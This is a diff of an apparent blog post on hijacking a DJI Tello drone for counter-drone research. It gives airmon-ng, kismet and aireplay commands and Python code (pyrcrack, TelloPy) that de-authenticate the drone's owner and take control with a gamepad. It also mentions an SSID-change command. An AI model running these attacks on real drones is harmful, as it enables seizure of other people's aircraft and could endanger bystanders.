@@ -7,11 +7,11 @@ import "@/assets/blog.css";
     <div class="content">
       <h1 id="a-way-to-hack-dji-tello">A way to hack Dji Tello</h1>
       <p>
-        I got an R&amp;D works a week ago that required me to hack multiple
+        I got an R&amp;D job few weeks ago that required me to hack multiple
         drones, also known as <em>Counter-Unmanned Aircraft Swarm System</em>.
-        This is a complicated and vast subject; I'm in charge of confrontation
-        and simulation work, but this is my first foray into the field, so first
-        and foremost, I need to understand how to hack a single simple drone.
+        I'm in charge of confrontation and simulation work, but this is my first
+        foray into the field, so first and foremost, I need to understand how to
+        hack a single simple drone.
       </p>
       <h2 id="system-design">System design</h2>
       <p>
@@ -21,9 +21,9 @@ import "@/assets/blog.css";
       </p>
       <p>
         <img
-          src="/src/assets/img/IMG20220929185104.jpg "
-          height="400"
+          src="/src/assets/img/IMG20220929185104.jpg"
           alt="image"
+          height="400px"
         />
       </p>
       <p>
@@ -32,19 +32,19 @@ import "@/assets/blog.css";
       <blockquote>
         <p>
           I chose the RK3399 chip as the card, but the RockPi pre-built Ubuntu
-          Focal <strong>didn't enable</strong> this driver by default; make sure
-          you choose a usable driver will make your life easier.
+          Focal <strong>didn't enable</strong> this driver by default; choose a
+          right device make your life easier.
         </p>
       </blockquote>
       <p>
-        I use front-end and back-end separated web service architecture as CUAS,
-        meanwhile I use RockPi board as a web server, follow the
-        <a href="https://wiki.radxa.com/Rock4/getting_started">document</a>
-        write <strong>Ubuntu 20.04 Server</strong> image to it.
+        This system use front-end and back-end separated web service
+        architecture, based on Ubuntu Server OS.
       </p>
       <p>
-        After that, install the necessary software <code>kismet</code>,
-        <code>python3.8</code> and <code>aircrack-ng</code>.
+        Use <code>kismet</code> to monitor devices information,
+        <code>aircrack-ng</code> handle de-auth attack,
+        <code>NetworkManager</code> and <code>python-socket</code> controls
+        connection.
       </p>
       <h3 id="take-a-try-first">Take a try first</h3>
       <pre
@@ -52,10 +52,10 @@ import "@/assets/blog.css";
       ><code><div>sudo airmon-ng start &lt;wlan_card&gt; # Enable monitor.
 <span class="hljs-meta">
 #</span><span class="bash"> Browser `localhost:2501` to use kismet web UI,</span>
-<span class="hljs-meta">#</span><span class="bash"> you can find drone's MAC address easily.</span>
+<span class="hljs-meta">#</span><span class="bash"> you can find drone`s MAC address easily.</span>
 kismet -c &lt;wlan_card_mon&gt;
 <span class="hljs-meta">
-#</span><span class="bash"><span class="hljs-string"> Connect to your drone from phone app, and de-authentication yourself</span></span>
+#</span><span class="bash"> Connect to your drone from phone app, and de-authentication yourself</span>
 sudo aireplay -D -deauth 10 -a &lt;drone_macaddr&gt; &lt;another_wlan_card&gt;
 </div></code></pre>
       <p>
@@ -109,6 +109,7 @@ sudo aireplay -D -deauth 10 -a &lt;drone_macaddr&gt; &lt;another_wlan_card&gt;
                     <span class="hljs-string">"uav.device"</span>,
                     <span class="hljs-string">"kismet.device.base.commonname"</span>,
                     <span class="hljs-string">"kismet.device.base.channel"</span>,
+                    <span class="hljs-string">"dot11.device/dot11.device.associate_ssid_map"</span>
                 ],
             },
             ...(Option || []),
@@ -127,19 +128,23 @@ sudo aireplay -D -deauth 10 -a &lt;drone_macaddr&gt; &lt;another_wlan_card&gt;
 <span class="hljs-keyword">from</span> pyrcrack <span class="hljs-keyword">import</span> AireplayNg
 
 
-<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deauth</span><span class="hljs-params">(interface, macaddr)</span>:</span>
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deauth</span><span class="hljs-params">(interface, macaddr, cliaddr)</span>:</span>
     <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> AireplayNg() <span class="hljs-keyword">as</span> aireplay:
-        <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> aireplay(interface, deauth=<span class="hljs-number">10</span>, D=<span class="hljs-literal">True</span>, a=macaddr):
+        <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> aireplay(interface, deauth=<span class="hljs-number">10</span>, D=<span class="hljs-literal">True</span>, a=macaddr, c=cliaddr):
             <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)
 
 <span class="hljs-comment"># Usage:</span>
-<span class="hljs-comment"># asyncio.run(deauth('wlan_card_mon','kismet.device.base.macaddr'))</span>
+<span class="hljs-comment"># asyncio.run(deauth('wlan_card_mon','kismet.device.base.macaddr','dot11.device/dot11.device.associate_ssid_map'))</span>
 </div></code></pre>
+      <p>
+        Declare &quot;cliaddr&quot; which is the last connection device from
+        drone, let de-auth attack only effect between drone and its owner.
+      </p>
       <h3 id="controller">Controller</h3>
       <p>
-        Because the GameSir T1d cannot connect to the drone directly when
-        hacked, I decided to use <strong>TelloPy</strong> as controller
-        middleware to convert the T1d signal into a drone control command.
+        Duo to the GameSir T1d cannot connect to the drone directly when hacked,
+        I decided to use <strong>TelloPy</strong> as controller middleware to
+        convert the T1d signal into a drone control command.
       </p>
       <p>
         T1d uses Bluetooth protocol to transmit data; there are three Services,
@@ -270,7 +275,7 @@ switch = {
 </div></code></pre>
       <p>
         <strong>TelloPy</strong> gave a game controller stick mapper (function
-        <code>__send_stick_command</code>) to control drone, so I modified it to
+        <code>__send_stick_command</code>) to control drone, so I motif it to
         adapt T1d:
       </p>
       <pre class="hljs"><code><div><span class="hljs-comment"># Python</span>
@@ -293,7 +298,7 @@ switch = {
     pkt.fixup()
     drone.send_packet(pkt)
 </div></code></pre>
-      <p>Finally, we can connect to a drone and control it with T1d:</p>
+      <p>Finally, we can connect to a drone and control ti with T1d:</p>
       <pre class="hljs"><code><div><span class="hljs-comment"># Python</span>
 <span class="hljs-keyword">import</span> struct
 <span class="hljs-keyword">import</span> sys
@@ -416,18 +421,19 @@ global_data = <span class="hljs-literal">None</span>
         <li>
           <p>
             The Tello SDK includes a Python example that demonstrates how to
-            send a text command: `sock.sendto('wifi &lt;new_ssid&gt;
-            &lt;pwd&gt;', tello address)`.
+            send a text command:
+            <code>sock.sendto('wifi new ssid&gt; pwd&gt;', tello address)</code
+            >.
+          </p>
+        </li>
+        <li>
+          <p>
+            The hole program has multiple job running in asynchronous, jobs need
+            response a statue to frontend, use a task queue such as
+            <code>flask-celery</code> will make schedule easier.
           </p>
         </li>
       </ul>
-      <blockquote>
-        <p>
-          You must connect twice. The first time, use udp socket to send change
-          SSID command and break, and the second time, use TelloPy to transmit
-          controller signal.
-        </p>
-      </blockquote>
       <h2 id="references--spacial-thanks">References &amp; Spacial thanks</h2>
       <p>
         <a
